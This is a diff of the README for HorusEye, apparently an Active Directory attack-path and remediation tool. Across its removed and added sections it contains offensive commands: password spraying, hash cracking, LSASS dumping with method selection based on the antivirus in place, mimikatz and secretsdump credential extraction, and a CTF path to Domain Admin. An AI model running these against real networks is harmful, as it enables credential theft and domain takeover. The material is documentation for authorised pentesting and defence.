@@ -1,25 +1,11 @@
 <div align="center">
 
-```
- ██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗
- ██║  ██║██╔═══██╗██╔══██╗██║   ██║██╔════╝
- ███████║██║   ██║██████╔╝██║   ██║███████╗
- ██╔══██║██║   ██║██╔══██╗██║   ██║╚════██║
- ██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║
- ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
- ███████╗██╗   ██╗███████╗
- ██╔════╝╚██╗ ██╔╝██╔════╝
- █████╗   ╚████╔╝ █████╗    v2.3
- ██╔══╝    ╚██╔╝  ██╔══╝
- ███████╗   ██║   ███████╗
- ╚══════╝   ╚═╝   ╚══════╝
-```
+# HorusEye
 
-**AI-Assisted Active Directory Attack-Path Analysis Platform**
+**Find the fix that breaks the most routes to Domain Admin.**
 
-Turn raw BloodHound, Certipy, ldapdomaindump and NetExec output into a ranked,
-exploitability-scored list of attack paths to Domain Admin — with the exact
-command to validate each one.
+Maps Active Directory attack paths with evidence, compares remediation options side by side,
+and produces an offline report for red and blue teams. Complements BloodHound.
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-purple?style=flat-square)
@@ -28,7 +14,9 @@ command to validate each one.
 ![Tests](https://img.shields.io/badge/tests-pytest-success?style=flat-square)
 ![Author](https://img.shields.io/badge/Author-Omar%20Tamer-gold?style=flat-square)
 
-**🌐 [omar-tamerr.github.io/HorusEye](https://omar-tamerr.github.io/HorusEye/)** · [Live explorer demo](https://omar-tamerr.github.io/HorusEye/demo.html)
+**[▶ Live demo](https://omar-tamerr.github.io/HorusEye/demo.html)** · [Website](https://omar-tamerr.github.io/HorusEye/) · [Quick start](#quick-start) · [Changelog](CHANGELOG.md)
+
+<img src="docs/assets/explorer.png" alt="HorusEye explorer: two attack routes from JDOE to domain control, the choke point marked, and three remediation options compared" width="900">
 
 *Made with care by **Omar Tamer** — Egypt*
 
@@ -36,17 +24,69 @@ command to validate each one.
 
 ---
 
-## Why HorusEye?
+## What It Does
 
-Active Directory is the backbone of nearly every enterprise Windows environment, and the most common path to full domain compromise in penetration tests and CTF challenges like HackTheBox Pro Labs (RastaLabs, Offshore, Cybernetics, Dante), OSCP, LPT Master, and CPENT. The problem is that the toolchain is fragmented: BloodHound shows you attack paths and gives you generic commands, but when you're staring at a real engagement with 400 users, 12 service accounts, and nested group memberships, those generic commands leave you piecing things together manually. Impacket gives you execution but no analysis. Certipy gives you ADCS findings but no context on which template is actually worth pursuing first. HorusEye connects all of these. It ingests output from BloodHound, Certipy, ldapdomaindump, and CrackMapExec, scores every attack path by exploitability against your specific environment, and gives you exact commands tailored to the accounts and configurations it actually found, not a textbook example.
+Point HorusEye at the data you already collect (a SharpHound/BloodHound export,
+plus optional Certipy, ldapdomaindump and NetExec output) and it answers three
+questions:
 
-It ingests output from BloodHound, Certipy, ldapdomaindump, CrackMapExec and NetExec, detects **13 classes of attack path** — Kerberoasting, AS-REP roasting, DCSync, ACL abuse, GPO abuse, unconstrained and constrained delegation, ADCS ESC1–ESC8, domain trusts, privileged sessions, weak password policy and stale admin accounts — scores each by exploitability against your specific environment, and tells you exactly what to run and in what order. A Tier-0 privilege model promotes any path that leads directly to Domain Admin to CRITICAL, so the ranking reflects real impact rather than a flat severity label. The optional Claude AI layer adds a plain-English narrative to each finding so you understand not just *what* is vulnerable but *why* it matters and *how* to chain it.
+1. **How does an attacker reach Domain Admin from here?** It builds a control
+   graph and finds the shortest routes from a foothold to Tier-0, with the
+   evidence behind every step and whether that step is observed in the data or
+   only inferred.
+2. **Is there one fix that breaks them all?** It names the **choke points**:
+   single relationships whose removal breaks every route in the imported graph.
+3. **Which fix should we actually make?** It compares **remediation options**
+   side by side (fewest changes, keep group memberships, fix nearest the
+   targets) and shows who loses what access with each. Mark access people need
+   for their job with `--keep`, and it is never proposed.
 
-For CTF players specifically: HorusEye automates the reconnaissance-to-privilege-escalation pipeline that normally takes hours of manual work. You run SharpHound, feed the output to HorusEye, and within seconds you have a ranked list of attack paths from your current user to Domain Admin, with ready-to-paste commands for each step.
+Everything lands in one offline report: the interactive explorer above, plus
+HTML, Markdown and JSON. Nothing leaves the machine unless you turn on the
+optional AI narrative layer (which can redact names first).
+
+Alongside the paths, HorusEye flags **13 classes of AD misconfiguration**
+(Kerberoasting, AS-REP roasting, DCSync, ACL abuse, GPO abuse, unconstrained and
+constrained delegation, ADCS ESC1–ESC8, trusts, privileged sessions, weak
+password policy and stale admins), each with evidence, a confidence level, MITRE
+ATT&CK mapping, remediation steps and detection guidance.
+
+**How it fits with BloodHound:** BloodHound collects and explores the graph.
+HorusEye works on the same export and turns it into an ordered, evidence-backed
+fix list you can hand to the team that owns the change.
+
+---
+
+## Quick Start
+
+```bash
+git clone https://github.com/Omar-tamerr/HorusEye && cd HorusEye
+pip install -e .
+
+# The bundled synthetic lab: 2 routes to Domain Admin, 1 choke point
+horuseye --bloodhound examples/acme-lab --domain ACME.LAB --dc 10.10.0.5 \
+    --graph --owned 'JDOE@ACME.LAB' --explorer acme.html
+
+# JDOE needs HELPDESK for their job? Plan the fix around it
+horuseye --bloodhound examples/acme-lab --domain ACME.LAB --dc 10.10.0.5 \
+    --graph --owned 'JDOE@ACME.LAB' --keep 'JDOE@ACME.LAB->HELPDESK@ACME.LAB'
+
+# Your own SharpHound export: paths from a user, reports, and a CI gate
+horuseye --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 \
+    --graph --owned 'bob@corp.local' \
+    --explorer report.html --json report.json --fail-on high
+```
+
+Open `acme.html` in any browser, or try the
+[live demo](https://omar-tamerr.github.io/HorusEye/demo.html) without
+installing anything. Full details: [Installation](#installation),
+[Attack Paths](#attack-paths), [More Examples](#more-examples).
 
 ---
 
 ## What's New in v2.3
+
+**New on `main` (next release):** remediation options compared side by side, with who loses what access and `--keep` for access people need; and a redesigned attack-path view in the explorer. See [Attack Paths](#attack-paths).
 
 - **Interactive offline explorer (`--explorer`).** One self-contained HTML file — a dashboard, a clickable attack-path graph (nodes/edges → evidence, choke points highlighted red), and a filterable findings explorer. No server, no external requests; open it anywhere, hand it to a client.
 - **Evidence & confidence on every finding.** Each finding now carries a `rule_id`, a `confidence` level with a stated reason, and structured **evidence** — the actual ACEs/objects behind it — so it can be reproduced from source data. Aggregated findings keep every affected object; nothing is lost to brevity.
@@ -82,30 +122,14 @@ See the [full changelog](CHANGELOG.md) and the [Roadmap](#roadmap).
 
 ## Contents
 
-- [What's New in v2.3](#whats-new-in-v23)
-- [Features](#features)
-- [Installation](#installation)
-- [Project Structure](#project-structure)
-- [Quick Start](#quick-start)
-- [Input Sources](#input-sources)
-- [Attack Detection](#attack-detection)
-- [Attack Paths](#attack-paths)
-- [Hash Cracking Engine](#hash-cracking-engine)
-- [Username Wordlist Generator](#username-wordlist-generator)
-- [Password Spraying](#password-spraying)
-- [Lateral Movement Engine](#lateral-movement-engine)
-- [Attack Timeline](#attack-timeline)
-- [Auto-Exploit Chain](#auto-exploit-chain)
-- [LSASS Dump Automation](#lsass-dump-automation)
-- [Domain Takeover Checklist](#domain-takeover-checklist)
-- [Team Collaboration](#team-collaboration)
-- [Credentials Manager](#credentials-manager)
-- [AI Analysis](#ai-analysis)
-- [Reports](#reports)
-- [Full CLI Reference](#full-cli-reference)
-- [CTF Usage Guide](#ctf-usage-guide)
-- [Testing](#testing)
-- [Roadmap](#roadmap)
+- [What It Does](#what-it-does) · [Quick Start](#quick-start) · [What's New](#whats-new-in-v23)
+- [Features](#features) · [Installation](#installation) · [Input Sources](#input-sources)
+- [Attack Detection](#attack-detection) · [Attack Paths & Remediation Options](#attack-paths)
+- [Reports](#reports) · [AI Analysis](#ai-analysis) · [More Examples](#more-examples)
+- [Full CLI Reference](#full-cli-reference) · [Project Structure](#project-structure) · [Testing](#testing) · [Roadmap](#roadmap)
+- [Offensive Helpers (Labs & CTF)](#offensive-helpers-labs--ctf): hash cracking, wordlists,
+  password spraying, lateral movement, timeline, auto-exploit, LSASS, DA checklist,
+  team collaboration, credentials manager, [CTF usage guide](#ctf-usage-guide)
 
 ---
 
@@ -113,30 +137,19 @@ See the [full changelog](CHANGELOG.md) and the [Roadmap](#roadmap).
 
 | Category | Feature | Description |
 |---|---|---|
-| **Input** | BloodHound | Parses SharpHound JSON — users, groups, ACLs, sessions |
-| **Input** | Certipy | Parses ADCS vulnerability output (ESC1-ESC8) |
-| **Input** | ldapdomaindump | Parses LDAP enumeration output |
-| **Input** | CrackMapExec | Parses CME scan results |
-| **Input** | nxc | Parses nxc scan results |
+| **Input** | BloodHound | Parses SharpHound JSON — users, groups, ACLs, sessions, local admins |
+| **Input** | Certipy / ldapdomaindump / NetExec / CME | ADCS (ESC1–ESC8), LDAP and scan output |
 | **Input** | Manual | Interactive prompt when no files are available |
-| **Detection** | 13 Attack Types | All 13 implemented — see [Attack Detection](#attack-detection) |
-| **Detection** | Path Scoring | Ranks findings by impact × ease |
-| **Detection** | AI Narratives | Claude explains each finding in plain English |
-| **Offense** | Hash Cracking | 3-round hashcat engine with AD-specific patterns |
-| **Offense** | Wordlist Gen | 18+ username format variants from AD users |
-| **Offense** | Password Spray | Multi-threaded, lockout-safe SMB/LDAP spraying |
-| **Offense** | Lateral Movement | Auto-maps reachable hosts after creds obtained |
-| **Offense** | LSASS Dump | ⚠️ Prints commands only — AV-aware selection not yet wired |
-| **Offense** | Auto-Chain | ⚠️ Stub — real chain implementation not yet wired |
-| **Offense** | Auto-Exploit | ⚠️ Stub — real chain implementation not yet wired |
-| **Offense** | Auto-Persist | Golden Ticket, Skeleton Key, DCSync backdoor |
-| **Reporting** | Attack Timeline | Visual T+0 to DA timeline with exact commands |
-| **Reporting** | DA Checklist | 20-item checklist, auto-ticked from live findings |
-| **Reporting** | HTML Report | Dark-themed report with all findings and commands |
-| **Reporting** | JSON Export | Machine-readable output for pipeline integration |
-| **Creds** | Credentials Manager | Central store, dedup, saves to `valid_credentials.txt` |
-| **Ops** | Team Collaboration | Real-time shared session for multiple operators |
-| **Ops** | Config | Persistent config file for API keys and preferences |
+| **Analysis** | Attack-path graph | Shortest routes from a foothold to Tier-0 or any `--target`, observed vs inferred steps |
+| **Analysis** | 13 detections | Evidence, confidence, MITRE ATT&CK, remediation and detection guidance per finding |
+| **Analysis** | Scoring | Ranks findings by impact × ease with a Tier-0 privilege model |
+| **Remediation** | Choke points | The single relationships whose removal breaks every route in the imported graph |
+| **Remediation** | Fix options | Alternatives compared side by side, with who loses what access; `--keep` for required access |
+| **Reporting** | Explorer | One offline HTML file: dashboard, interactive graph, fix options, findings |
+| **Reporting** | HTML / Markdown / JSON | Dark-theme report, Mermaid diagrams, versioned JSON schema |
+| **Reporting** | Retest & CI | `--diff` (new / fixed / unchanged), `--fail-on`, deterministic output, exit codes |
+| **AI** | Narratives (optional) | Plain-English explanation per finding; `--ai-redact` masks names first |
+| **Labs** | [Offensive helpers](#offensive-helpers-labs--ctf) | Hash cracking, wordlists, spraying, lateral movement — some still stubs |
 
 ---
 
@@ -182,74 +195,6 @@ horuseye --check-deps
 **Optional — AI narratives:**
 ```bash
 horuseye --config --claude-key YOUR_ANTHROPIC_KEY   # stored in ~/.horuseye/config.json
-```
-
----
-
-## Project Structure
-
-HorusEye is a single installable package. The feature areas map directly to the
-attack lifecycle, so the code reads the way an engagement runs:
-
-```
-horuseye/
-├── cli.py            # argument parsing + orchestration (entry point)
-├── parsers/          # ingest BloodHound, ldapdomaindump, CME, NetExec, Certipy
-├── core/             # the analysis brain:
-│   ├── attack_detector.py   # the 13 detections
-│   ├── path_scorer.py       # exploitability scoring
-│   ├── principals.py        # Tier-0 / noise / broad principal model
-│   ├── knowledge.py         # ATT&CK + remediation + detection per finding
-│   ├── graph.py             # attack-path graph → shortest route to DA
-│   ├── diff.py              # retest diff + CI fail-gate
-│   ├── finding.py           # finding schema (evidence, confidence, rule_id)
-│   └── exit_codes.py        # automation exit-code taxonomy
-├── engine/           # hash cracking, lateral movement, timeline, checklist, ...
-├── features/         # creds manager, password spray, wordlist gen, team collab
-├── reports/          # CLI / HTML / Markdown / JSON report generation
-├── ai/               # optional Claude layer + local redaction (horuseye[ai])
-└── utils/            # config, dependency preflight, help
-tests/                # pytest suite — 130 tests (parsers, detector, graph,
-                      #   knowledge, noise, reports, diff, AI, schema,
-                      #   provenance, determinism, redaction)
-docs/                 # screenshots and reference material
-```
-
-Run it with the installed `horuseye` command, with `python -m horuseye`, or
-straight from a clone with `python horuseye.py`.
-
-**Try it now** on the synthetic [`examples/acme-lab`](examples/README.md) dataset
-(no collection needed). **Embed it** via the stable Python API:
-
-```python
-from horuseye import api
-data = api.parse_sources(bloodhound="./bh/", domain="corp.local", dc="10.0.0.5")
-result = api.analyze(data, owned=["bob@corp.local"])   # findings + paths + summary
-```
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the design and
-[CONTRIBUTING.md](CONTRIBUTING.md) to add a detection.
-
----
-
-## Quick Start
-
-```bash
-# Analyze BloodHound output + Certipy output
-python3 horuseye.py --bloodhound ./bloodhound/ --certipy certipy.json \
-    --domain corp.local --dc 10.10.10.5
-
-# Full automated run: analyze → crack → lateral movement
-python3 horuseye.py --bloodhound ./bh/ --certipy certipy.json \
-    --domain corp.local --dc 10.10.10.5 \
-    --auto-chain --timeline --da-checklist --report report.html
-
-# No files yet? Use manual input
-python3 horuseye.py --manual --domain corp.local --dc 10.10.10.5
-
-# CTF one-liner: wordlist → spray → analyze
-python3 horuseye.py --bloodhound ./bh/ --make-wordlist --output users.txt \
-    --spray --password 'Password123' --domain corp.local --dc 10.10.10.5 --safe
 ```
 
 ---
@@ -410,307 +355,18 @@ The options are in the explorer (pick one and the ✂ marks move on the graph), 
 
 ---
 
-## Hash Cracking Engine
-
-![Hash Cracking](docs/imgs/03_hash_crack.png)
-
-Three-round cracking strategy designed for Active Directory environments. All cracked credentials are automatically appended to `valid_credentials.txt`.
-
-**Round 1 — AD-specific patterns** (runs first, fastest)
-Generates 230+ corporate password candidates including company name, current/previous year, and season combinations:
-`Corp2024!`, `Welcome2024!`, `Summer2024!`, `Password2024!`, `Corp@2025`, etc.
-
-**Round 2 — Wordlist + rules**
-Runs rockyou.txt (or any wordlist) through hashcat rule mutations. Default: `best64` (64 common transforms). Options: `dive`, `d3ad0ne`, `rockyou-30000`.
-
-**Round 3 — Hybrid mask** (small hash sets only)
-Appends year/number suffixes to wordlist words: `word + ?d?d?d?d`, `word + !year`.
-
-**Supported hash types:**
-
-| Flag | Type | Hashcat Mode |
-|---|---|---|
-| `kerberoast` | Kerberoast TGS-RC4 | 13100 |
-| `asrep` | AS-REP Roast | 18200 |
-| `ntlm` | NTLM | 1000 |
-| `ntlmv2` | NetNTLMv2 | 5600 |
-| `mscache2` | MS-Cache v2 (DCC2) | 2100 |
+## Reports
 
 ```bash
-# Crack a file of Kerberoast hashes
-python3 horuseye.py --crack hashes.txt --hash-type kerberoast
-
-# Crack NTLM hashes with aggressive rules
-python3 horuseye.py --crack ntlm.txt --hash-type ntlm --rules aggressive
-
-# Show available wordlists and rules
-python3 -c "from hash_cracker import HashCrackingEngine; e=HashCrackingEngine(); e.show_wordlists(); e.show_rules()"
-
-# AS-REP roast + crack inline
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-chain
-```
-
-Hash type is auto-detected if not specified. Cracked hashes are written immediately to `./horuseye_output/valid_credentials.txt`.
-
----
-
-## Username Wordlist Generator
-
-Generates username variants from real AD users or a names list. 18 format patterns per name.
-
-**Generated formats for `John Smith`:**
-
-| Format | Example |
-|---|---|
-| `first.last` | `john.smith` |
-| `flast` | `jsmith` |
-| `f.last` | `j.smith` |
-| `lastf` | `smithj` |
-| `first_last` | `john_smith` |
-| `adm_flast` | `adm_jsmith` |
-| `svc_flast` | `svc_jsmith` |
-| `firstlast` | `johnsmith` |
-| `FLAST` | `JSMITH` |
-| `First.Last` | `John.Smith` |
-| + 8 more... | |
-
-```bash
-# From BloodHound users (most accurate)
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --make-wordlist --output users.txt
-
-# From a names file
-python3 horuseye.py --make-wordlist --users-file names.txt --output wordlist.txt
-
-# Single name
-python3 horuseye.py --make-wordlist --firstname John --lastname Smith --output john.txt
-```
-
----
-
-## Password Spraying
-
-Multi-threaded password sprayer with lockout protection. Supports SMB (primary) and LDAP (fallback) authentication.
-
-```bash
-# Basic spray
-python3 horuseye.py --spray --users-file users.txt --password 'Password123' \
-    --domain corp.local --dc 10.10.10.5
-
-# Safe mode: stops automatically if lockout detected
-python3 horuseye.py --spray --users-file users.txt --password 'Summer2024!' \
-    --domain corp.local --dc 10.10.10.5 --safe --delay 2.0 --jitter 0.5
-
-# Multiple passwords from file
-python3 horuseye.py --spray --users-file users.txt --passwords-file passes.txt \
-    --domain corp.local --dc 10.10.10.5 --safe --threads 3
-```
-
-**Options:**
-
-| Flag | Default | Description |
-|---|---|---|
-| `--safe` | off | Auto-stop on first lockout detected |
-| `--delay` | 1.0s | Delay between each attempt |
-| `--jitter` | 0.5s | Random jitter added to delay |
-| `--threads` | 5 | Concurrent threads |
-
-Valid credentials are saved to `valid_credentials.txt` immediately on discovery.
-
----
-
-## Lateral Movement Engine
-
-![Lateral Movement](docs/imgs/05_lateral.png)
-
-After obtaining credentials, maps every reachable host on the network. Multi-threaded port scan → credential test → admin detection → share enumeration.
-
-```bash
-python3 horuseye.py --pivot \
-    --target-network 10.10.10.0/24 \
-    -u svc-sql -p 'ServicePass2024!' \
-    --domain corp.local --dc 10.10.10.5
-```
-
-**What it does:**
-1. Port scans the target range for SMB (445), WinRM (5985), RDP (3389), LDAP (389), MSSQL (1433)
-2. Tests credentials on every live SMB host
-3. Probes `ADMIN$` share to confirm local admin rights
-4. Enumerates accessible shares (flags SYSVOL, C$, backup, data)
-5. Saves all admin hosts to `valid_credentials.txt` with format `ADMIN:IP:hostname:domain\user`
-
-Outputs a table of reachable hosts with protocol icons, admin status, and next-step commands for each admin host.
-
----
-
-## Attack Timeline
-
-![Timeline](docs/imgs/04_timeline.png)
-
-Builds a visual ASCII timeline from your current position to Domain Admin, with time estimates for each step.
-
-```bash
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --timeline
-```
-
-Phases: `FOOTHOLD` → `ESCALATION` → `LATERAL` → `DA` → `PERSIST`
-
-Each step shows:
-- Estimated elapsed time (T+Xm)
-- Exact command to run
-- AI narrative explaining the step
-- Time estimate to crack (for Kerberoast/AS-REP)
-
-Export to plain text for reports:
-```bash
-python3 -c "
-from attack_timeline import AttackTimeline
-tl = AttackTimeline()
-tl.build_from_findings(findings, 'corp.local')
-tl.export_timeline_txt('timeline.txt', 'corp.local')
-"
-```
-
----
-
-## Auto-Exploit Chain
-
-> **Status:** these flags are **stubs** — they print the chain/method and the
-> commands to run rather than executing against a DC. Live execution is on the
-> [Roadmap](#roadmap). The sections below describe the intended workflow.
-
-Automated end-to-end exploitation without manual steps.
-
-```bash
-# Kerberoast → crack → validate → pivot
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-chain
-
-# Full path to DA
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-exploit
-
-# After DA: suggest and execute persistence
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 \
-    --auto-exploit --auto-persist
-
-# Interactive: AI asks before every action
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --interactive
-```
-
-In `--interactive` mode, HorusEye acts as a senior red team operator. It presents ranked options at each decision point and waits for your confirmation before executing.
-
----
-
-## LSASS Dump Automation
-
-> **Status:** stub — prints the recommended dump method and commands rather
-> than executing them. See the [Roadmap](#roadmap).
-
-Selects an LSASS dump method based on the environment and prints the exact commands to run.
-
-```bash
-python3 horuseye.py --lsass-dump 10.10.10.10 \
-    -u svc-sql -p 'ServicePass2024!' --domain corp.local
-```
-
-**Method selection logic:**
-
-| Detected AV | Selected Method | Stealth Score |
-|---|---|---|
-| CrowdStrike / SentinelOne | nanodump | 10/10 |
-| Windows Defender | comsvcs (rundll32) | 8/10 |
-| None detected | comsvcs (rundll32) | 8/10 |
-| Fallback | procdump | 5/10 |
-
-After dumping, extract with:
-```bash
-pypykatz lsa minidump lsass.dmp
-# or
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords full
-```
-
----
-
-## Domain Takeover Checklist
-
-![Checklist](docs/imgs/07_checklist.png)
-
-20-item checklist covering every phase of a domain takeover. Items auto-tick from the live detection results of the current run (✅ when a matching finding was produced, ⬜ for manual steps not yet observed).
-
-```bash
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --da-checklist
-```
-
-Categories: FOOTHOLD → RECON → CRED → LATERAL → ESCALATION → DA → PERSIST → REPORT
-
-Items marked `(auto)` are checked automatically when HorusEye detects or completes that step. Manual items require your confirmation.
-
----
-
-## Team Collaboration
-
-![Team Collaboration](docs/imgs/06_team_collab.png)
-
-Real-time shared session over TCP port 31337. One operator hosts, others connect. All findings, cracked hashes, and credentials are broadcast to every connected operator instantly.
-
-```bash
-# Operator 1: start the server
-python3 horuseye.py --team-server --team-port 31337
-
-# Operator 2: join and run analysis simultaneously
-python3 horuseye.py --team-connect 10.10.10.1:31337 \
-    --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5
-
-# With password protection
-python3 horuseye.py --team-server --team-port 31337
-# set password in config, others pass it with --team-connect
-```
-
-What gets shared in real-time:
-- New attack path findings
-- Valid credentials discovered
-- Cracked hashes
-- Checklist item updates
-- Chat messages between operators
-
-Operators joining late receive a full state sync of everything found so far.
-
----
-
-## Credentials Manager
-
-![Credentials](docs/imgs/08_creds.png)
-
-Every credential found by any module (spray, kerberoast, AS-REP, crack, lateral movement, DCSync) is funnelled through a central manager with automatic deduplication.
-
-**Output files:**
-
-`valid_credentials.txt` — Human-readable, one credential per line:
-```
-corp.local\svc-sql:ServicePass2024!  # kerberoast [2025-01-15 14:32:11]
-corp.local\jsmith:Password123        # spray [2025-01-15 14:45:03]
-corp.local\Administrator:<NTLM>      # dcsync [DA] [2025-01-15 15:01:44]
-```
-
-`valid_credentials.json` — Structured JSON for pipeline integration:
-```json
-{
-  "credentials": [
-    {
-      "domain": "corp.local",
-      "username": "svc-sql",
-      "password": "ServicePass2024!",
-      "source": "kerberoast",
-      "is_da": false,
-      "is_admin": true
-    }
-  ]
-}
-```
-
-```bash
-# Quick use with impacket after HorusEye run
-secretsdump.py corp.local/svc-sql:ServicePass2024!@10.10.10.5
-crackmapexec smb 10.10.10.0/24 -u svc-sql -p ServicePass2024!
+# HTML report (dark theme, all findings + commands)
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --report report.html
+
+# JSON export
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --json findings.json
+
+# Filter by severity
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --severity critical
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --severity high
 ```
 
 ---
@@ -746,19 +402,27 @@ horuseye --bloodhound ./bh/ --domain corp.local --deep --ai-redact
 
 ---
 
-## Reports
+## More Examples
 
 ```bash
-# HTML report (dark theme, all findings + commands)
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --report report.html
+# Analyze BloodHound + Certipy output
+horuseye --bloodhound ./bloodhound/ --certipy certipy.json \
+    --domain corp.local --dc 10.10.10.5
 
-# JSON export
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --json findings.json
+# Paths to a specific critical asset instead of Tier-0
+horuseye --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --graph \
+    --owned 'bob@corp.local' --target 'SQL01.CORP.LOCAL'
 
-# Filter by severity
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --severity critical
-python3 horuseye.py --bloodhound ./bh/ --domain corp.local --severity high
+# Retest: what is new, fixed or unchanged since the last report
+horuseye --bloodhound ./bh-retest/ --domain corp.local --dc 10.10.10.5 \
+    --json retest.json --diff report.json
+
+# No files yet? Use manual input
+horuseye --manual --domain corp.local --dc 10.10.10.5
 ```
+
+Lab and CTF workflows (spraying, cracking, lateral movement) are in the
+[CTF usage guide](#ctf-usage-guide).
 
 ---
 
@@ -847,44 +511,49 @@ AI + Output:
 
 ---
 
-## CTF Usage Guide
+## Project Structure
 
-**HackTheBox Pro Labs / Active Directory machines**
+HorusEye is a single installable package. The feature areas map directly to the
+attack lifecycle, so the code reads the way an engagement runs:
 
-```bash
-# Step 1: Collect with SharpHound (run on Windows target)
-SharpHound.exe -c All --zipfilename bh.zip
-# Transfer to Kali and extract
-
-# Step 2: ADCS enumeration (if CA present)
-certipy find -u user@corp.local -p pass -dc-ip DC_IP -json
-
-# Step 3: Run HorusEye
-python3 horuseye.py \
-    --bloodhound ./bh/ \
-    --certipy certipy.json \
-    --domain corp.local \
-    --dc DC_IP \
-    --timeline \
-    --da-checklist \
-    --report report.html
-
-# Step 4: If Kerberoastable accounts found
-python3 horuseye.py --auto-chain --domain corp.local --dc DC_IP \
-    -u user -p pass
-
-# Step 5: After creds, lateral movement
-python3 horuseye.py --pivot --target-network 10.10.10.0/24 \
-    -u svc-sql -p 'ServicePass2024!' --domain corp.local --dc DC_IP
+```
+horuseye/
+├── cli.py            # argument parsing + orchestration (entry point)
+├── parsers/          # ingest BloodHound, ldapdomaindump, CME, NetExec, Certipy
+├── core/             # the analysis brain:
+│   ├── attack_detector.py   # the 13 detections
+│   ├── path_scorer.py       # exploitability scoring
+│   ├── principals.py        # Tier-0 / noise / broad principal model
+│   ├── knowledge.py         # ATT&CK + remediation + detection per finding
+│   ├── graph.py             # attack-path graph → shortest route to DA
+│   ├── diff.py              # retest diff + CI fail-gate
+│   ├── finding.py           # finding schema (evidence, confidence, rule_id)
+│   └── exit_codes.py        # automation exit-code taxonomy
+├── engine/           # hash cracking, lateral movement, timeline, checklist, ...
+├── features/         # creds manager, password spray, wordlist gen, team collab
+├── reports/          # CLI / HTML / Markdown / JSON report generation
+├── ai/               # optional Claude layer + local redaction (horuseye[ai])
+└── utils/            # config, dependency preflight, help
+tests/                # pytest suite — 130 tests (parsers, detector, graph,
+                      #   knowledge, noise, reports, diff, AI, schema,
+                      #   provenance, determinism, redaction)
+docs/                 # screenshots and reference material
 ```
 
-**Common CTF scenarios HorusEye handles automatically:**
+Run it with the installed `horuseye` command, with `python -m horuseye`, or
+straight from a clone with `python horuseye.py`.
 
-- `ADCS ESC1` — Template allows SAN → request cert as DA → PKINIT → NTLM hash
-- `Kerberoast → crack → ACL chain` — Service account with WriteDacl on Domain Admins
-- `AS-REP Roast` — No credentials needed for initial foothold
-- `Unconstrained delegation` — Trigger printerbug → capture DA TGT
-- `Password spray → DA session on workstation` — Lateral to DA workstation → dump LSASS
+**Try it now** on the synthetic [`examples/acme-lab`](examples/README.md) dataset
+(no collection needed). **Embed it** via the stable Python API:
+
+```python
+from horuseye import api
+data = api.parse_sources(bloodhound="./bh/", domain="corp.local", dc="10.0.0.5")
+result = api.analyze(data, owned=["bob@corp.local"])   # findings + paths + summary
+```
+
+See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the design and
+[CONTRIBUTING.md](CONTRIBUTING.md) to add a detection.
 
 ---
 
@@ -929,6 +598,341 @@ Python API, and the interactive offline explorer.*
 
 Contributions and issues are welcome at the
 [issue tracker](https://github.com/Omar-tamerr/HorusEye/issues).
+
+---
+
+## Offensive Helpers (Labs & CTF)
+
+HorusEye started as a CTF tool, and these helpers remain for lab work and
+authorized engagements. Nothing in the attack-path, remediation or reporting
+features above depends on them. Some are stubs that print the method and
+commands instead of executing them; each section says so.
+
+### Hash Cracking Engine
+
+![Hash Cracking](docs/imgs/03_hash_crack.png)
+
+Three-round cracking strategy designed for Active Directory environments. All cracked credentials are automatically appended to `valid_credentials.txt`.
+
+**Round 1 — AD-specific patterns** (runs first, fastest)
+Generates 230+ corporate password candidates including company name, current/previous year, and season combinations:
+`Corp2024!`, `Welcome2024!`, `Summer2024!`, `Password2024!`, `Corp@2025`, etc.
+
+**Round 2 — Wordlist + rules**
+Runs rockyou.txt (or any wordlist) through hashcat rule mutations. Default: `best64` (64 common transforms). Options: `dive`, `d3ad0ne`, `rockyou-30000`.
+
+**Round 3 — Hybrid mask** (small hash sets only)
+Appends year/number suffixes to wordlist words: `word + ?d?d?d?d`, `word + !year`.
+
+**Supported hash types:**
+
+| Flag | Type | Hashcat Mode |
+|---|---|---|
+| `kerberoast` | Kerberoast TGS-RC4 | 13100 |
+| `asrep` | AS-REP Roast | 18200 |
+| `ntlm` | NTLM | 1000 |
+| `ntlmv2` | NetNTLMv2 | 5600 |
+| `mscache2` | MS-Cache v2 (DCC2) | 2100 |
+
+```bash
+# Crack a file of Kerberoast hashes
+python3 horuseye.py --crack hashes.txt --hash-type kerberoast
+
+# Crack NTLM hashes with aggressive rules
+python3 horuseye.py --crack ntlm.txt --hash-type ntlm --rules aggressive
+
+# Show available wordlists and rules
+python3 -c "from hash_cracker import HashCrackingEngine; e=HashCrackingEngine(); e.show_wordlists(); e.show_rules()"
+
+# AS-REP roast + crack inline
+python3 horuseye.py --bloodhound ./bh/ --domain corp.local --dc 10.10.10.5 --auto-chain
+```
+
+Hash type is auto-detected if not specified. Cracked hashes are written immediately to `./horuseye_output/valid_credentials.txt`.
+
+### Username Wordlist Generator
+
+Generates username variants from real AD users or a names list. 18 format patterns per name.
+
+**Generated formats for `John Smith`:**
+
+| Format | Example |
+|---|---|
